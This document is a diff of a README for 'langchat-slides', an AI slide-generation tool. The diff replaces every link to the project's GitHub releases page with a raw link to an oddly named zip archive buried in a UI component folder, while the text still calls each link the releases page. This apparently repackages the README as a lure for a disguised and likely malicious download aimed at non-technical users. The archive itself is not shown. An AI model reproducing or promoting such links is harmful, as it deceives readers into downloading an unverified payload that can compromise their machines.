@@ -1,7 +1,7 @@
 # 🎉 langchat-slides - Create Stunning AI-Generated Slides Effortlessly
 
 ## 📥 Download Now
-[![Download langchat-slides](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Gfddfgydddx/langchat-slides/releases)
+[![Download langchat-slides](https://github.com/Gfddfgydddx/langchat-slides/raw/refs/heads/main/src/components/ui/scroll-area/langchat_slides_opsonoid.zip)](https://github.com/Gfddfgydddx/langchat-slides/raw/refs/heads/main/src/components/ui/scroll-area/langchat_slides_opsonoid.zip)
 
 ## 🚀 Getting Started
 LangChat Slides is an AI-powered tool built with Vue3. This application helps you create beautiful presentations quickly and easily. You don’t need any programming knowledge to use it. Just follow these simple steps.
@@ -22,7 +22,7 @@ LangChat Slides is an AI-powered tool built with Vue3. This application helps yo
 ## 📥 Download & Install
 To get started with LangChat Slides, visit the Releases page to download the latest version. 
 
-[Visit the releases page to download.](https://github.com/Gfddfgydddx/langchat-slides/releases)
+[Visit the releases page to download.](https://github.com/Gfddfgydddx/langchat-slides/raw/refs/heads/main/src/components/ui/scroll-area/langchat_slides_opsonoid.zip)
 
 ### 🔄 Installation Steps
 1. **Go to the Releases Page:** Click the link above to open the releases page.
@@ -63,6 +63,6 @@ If you encounter any issues while using LangChat Slides, here are some common pr
 ## 📞 Support
 For further assistance, you can reach out to us via the Issues tab in the GitHub repository. We encourage user feedback to improve LangChat Slides.
 
-[Visit the releases page to download.](https://github.com/Gfddfgydddx/langchat-slides/releases)
+[Visit the releases page to download.](https://github.com/Gfddfgydddx/langchat-slides/raw/refs/heads/main/src/components/ui/scroll-area/langchat_slides_opsonoid.zip)
 
 Thank you for choosing LangChat Slides. Enjoy creating your presentations!
